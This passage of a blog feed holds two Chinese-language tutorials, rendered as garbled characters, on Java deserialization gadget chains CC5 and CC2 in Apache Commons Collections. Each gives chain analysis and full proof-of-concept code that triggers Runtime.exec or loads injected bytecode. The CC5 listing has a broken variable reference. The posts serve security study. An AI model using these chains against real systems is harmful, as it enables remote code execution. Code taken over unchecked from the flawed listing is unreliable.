    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬è´¨ä¸Šä¹Ÿå°±æ˜¯å‰é¢å‡ æ¡CCé“¾æ”¹æ¥æ”¹å»ï¼Œæ¢äº†ä¸€ä¸ªå…¥å£ç±»ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/CC5.png" alt="CC5"></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li>JDK8u65</li><li>commons-collections 3.2.1</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºæ¥è¿˜æ˜¯é€šè¿‡<code>LazyMap</code>è°ƒç”¨<code>ChainedTransformer.transform()</code>æœ€ç»ˆè°ƒç”¨<code>InvokerTransformer.transform()</code>æ‰§è¡Œä»£ç </p><p>æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œæ‰¾è°è°ƒç”¨äº†<code>get()</code>æ–¹æ³•ï¼Œ2000+ç»“æœï¼Œå‡­æˆ‘ä»¬è‡ªå·±å¯èƒ½å¾ˆéš¾æ‰¾åˆ°äº†ï¼Œysoserialä¸­æœ€ç»ˆæ˜¯æ‰¾åˆ°äº†<code>TiedMapEntry.toString()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602153105891.png" alt="image-20240602153105891"></p><p><code>TiedMapEntry.toString</code>è°ƒç”¨äº†<code>getValue()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602151949039.png" alt="image-20240602151949039"></p><p><code>TiedMapEntry.getValue()</code>æœ€ç»ˆè°ƒç”¨äº†<code>get()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152006941.png" alt="image-20240602152006941"></p><p>é‚£æ¥ç€å°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>toString()</code>æ–¹æ³•æœ€å¥½æ˜¯åœ¨<code>readObject()</code>ä¸­ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†<code>BadAttributeValueExpException.readObject()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152124747.png" alt="image-20240602152124747"></p><h2 id="CC5ç¼–å†™"><a href="#CC5ç¼–å†™" class="headerlink" title="CC5ç¼–å†™"></a>CC5ç¼–å†™</h2><p>ä»ä¸Šé¢çš„å›¾ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ååŠéƒ¨åˆ†é“¾å…¶å®å’ŒCC1æˆ–è€…CC6æ˜¯ä¸€æ ·çš„ï¼Œå¤åˆ¶ç²˜è´´æ²¡ä»€ä¹ˆå¥½è¯´çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntryæ”¾å…¥lazymapï¼ŒTiedMapEntryçš„æ„é€ å™¨ä¸­ç¬¬ä¸€ä¸ªä¸ºMapï¼Œç¬¬äºŒä¸ªä¸ºObjectã€‚æ‰€ä»¥mapå°±å¯ä»¥ä¼ å…¥æˆ‘ä»¬æ„é€ å¥½çš„lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//æ„æ€æ˜¯ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡ŒBadAttributeValueExpException.readObject()ï¼Œå› ä¸ºBadAttributeValueExpExceptionæ”¾å…¥çš„æ˜¯tiedMapEntryï¼Œé‚£å°±ä¼šæ‰§è¡ŒtiedMapEntryçš„readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>        <br></code></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜"><a href="#åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜" class="headerlink" title="åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜"></a>åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜</h3><p>å†™äº†ä¸Šé¢çš„ä»£ç å‘ç°ï¼Œåºåˆ—åŒ–çš„æ—¶å€™å°±è‡ªåŠ¨æ‰§è¡Œäº†ã€‚è°ƒè¯•ä¸€ä¸‹å°±å°±çŸ¥é“ï¼Œåœ¨<code>BadAttributeValueExpException</code>çš„æ„é€ å™¨ç›´æ¥è°ƒç”¨äº†<code>toString()</code>æ–¹æ³•ï¼Œå¯¼è‡´åºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œå®Œæ¯•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602154714433.png" alt="image-20240602154714433"></p><p>è§£å†³åŠæ³•å°±æ˜¯é€šè¿‡åå°„å…ˆæ”¾ä¸€ä¸ªæ²¡ç”¨çš„ä¸œè¥¿åœ¨é‡Œé¢ï¼Œåºåˆ—åŒ–ä¹‹å‰å†æŠŠ<code>tiedMapEntry</code>æ”¾è¿›å»ã€‚</p><p><code>BadAttributeValueExpException</code>ä¹Ÿæ”¯æŒåºåˆ—åŒ–ï¼Œè™½ç„¶å½“å‰ç±»æ²¡æœ‰ç›´æ¥ç»§æ‰¿<code>Serializable</code>æ¥å£ï¼Œä½†æ˜¯å®ƒç¥–ç±»<code>Throwable</code>ç»§æ‰¿äº†Serializableæ¥å£ï¼Œæ‰€ä»¥<code>BadAttributeValueExpException</code>ä¹Ÿæ”¯æŒåºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Object<br>  â†³ java.lang.Throwable<br>    â†³ java.lang.Exception<br>      â†³ javax.management.BadAttributeValueExpException<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152143747.png" alt="image-20240602152143747"></p><h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntryæ”¾å…¥lazymapï¼ŒTiedMapEntryçš„æ„é€ å™¨ä¸­ç¬¬ä¸€ä¸ªä¸ºMapï¼Œç¬¬äºŒä¸ªä¸ºObjectã€‚æ‰€ä»¥mapå°±å¯ä»¥ä¼ å…¥æˆ‘ä»¬æ„é€ å¥½çš„lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//æ„æ€æ˜¯ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡ŒBadAttributeValueExpException.readObject()ï¼Œå› ä¸ºBadAttributeValueExpExceptionæ”¾å…¥çš„æ˜¯tiedMapEntryï¼Œé‚£å°±ä¼šæ‰§è¡ŒtiedMapEntryçš„readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹å€¼</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BadAttributeValueExpException</span>&gt; c = badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(badAttributeValueExpException, tiedMapEntry);<br><br><br>        serialize(badAttributeValueExpException1);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC2</title>
    <link href="/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC2/"/>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC2/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC3ä¸­æˆ‘ä»¬äº†è§£åˆ°<code>TemplatesImpl()</code>è°ƒç”¨<code>Transformer()</code>æ–¹æ³•å°±å¯ä»¥ä»£ç æ‰§è¡Œã€‚</p><p>CC2å°±åœ¨åœ¨è¿™ä¸ªåŸºç¡€ä¸Šï¼Œç»“åˆCC4æ”¹å†™ã€‚CC2æœ€å¤§çš„ä¼˜åŠ¿å°±æ˜¯ä¸ç”¨<code>Transformer</code> æ•°ç»„ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li>JDK8u65</li><li>CommonsCollections4</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="CC2è°ƒç”¨é“¾åˆ†æ"><a href="#CC2è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="CC2è°ƒç”¨é“¾åˆ†æ"></a>CC2è°ƒç”¨é“¾åˆ†æ</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p><h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-comment">//å’ŒCC4ä¸€æ ·</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br><span class="hljs-comment">//æ„é€ InvokerTransformerç±»å»è°ƒç”¨templateså¯¹è±¡çš„newTransformer()æ–¹æ³•</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//åˆ›å»ºTransformingComparatorç±»å¯¹è±¡ï¼Œä¼ â¼Šä¸€ä¸ªä¸´æ—¶çš„Transformerç±»å¯¹è±¡(ConstantTransformer)ï¼Œè®©ä»£ç åºåˆ—åŒ–çš„æ—¶å€™ä¸æ‰§è¡Œï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œã€‚</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//åˆ›å»º PriorityQueueç±»å¯¹è±¡ä¼ å…¥transformingComparatorå¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶å‘é˜Ÿåˆ—â¾¥æ·»åŠ çš„å…ƒç´ å°±æ˜¯æˆ‘ä»¬å‰â¾¯åˆ›å»ºçš„ TemplatesImplå¯¹è±¡äº†ï¼Œè¿™æ˜¯å› ä¸ºæœ€åè°ƒç”¨ PriorityQueue.compare() çš„æ—¶å€™æ˜¯ä¼ å…¥é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªå¯¹è±¡ï¼Œç„¶å compare()ä¸­è°ƒç”¨ Transformer.transform(obj1) çš„æ—¶å€™ç”¨çš„æ˜¯ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å°†priorityQueueé˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå¯¹è±¡è®¾ç½®ä¸ºæ„é€ å¥½çš„ templates å¯¹è±¡ã€‚</span><br>        <span class="hljs-comment">//PriorityQueueè°ƒç”¨TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" alt="image-20240602022510898"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡05-CC2é“¾</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC4</title>
    <link href="/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/"/>
    <url>/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/</url>
    
